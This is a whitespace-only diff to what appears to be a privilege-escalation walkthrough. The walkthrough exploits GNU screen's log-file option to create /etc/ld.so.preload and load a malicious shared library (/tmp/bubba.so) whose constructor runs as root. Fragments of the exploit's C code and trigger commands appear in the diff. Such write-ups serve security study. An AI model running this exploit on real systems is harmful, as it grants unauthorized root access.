@@ -290,6 +290,7 @@ First create the shared library object that will be ran by `screen` from the `/e
 #include <stdio.h>
 #include <sys/types.h>
 #include <unistd.h>
+
 __attribute__ ((__constructor__))
 void bubba(void){
   printf("[*] removing /etc/ld.so.preload ...\n");
@@ -340,7 +341,7 @@ Next, trigger the vulnerability by creating the file `/etc/ld.so.preload` which 
 # reset umask
 umask 000
 # create /etc/ld.so.preload
-screen -D -m -L /etc/ld.so.preload echo -ne  "\x0a/tmp/bubba.so"
+screen -D -m -L /etc/ld.so.preload echo -ne "\x0a/tmp/bubba.so"
 # spawn the child process
 screen -ls
 ```
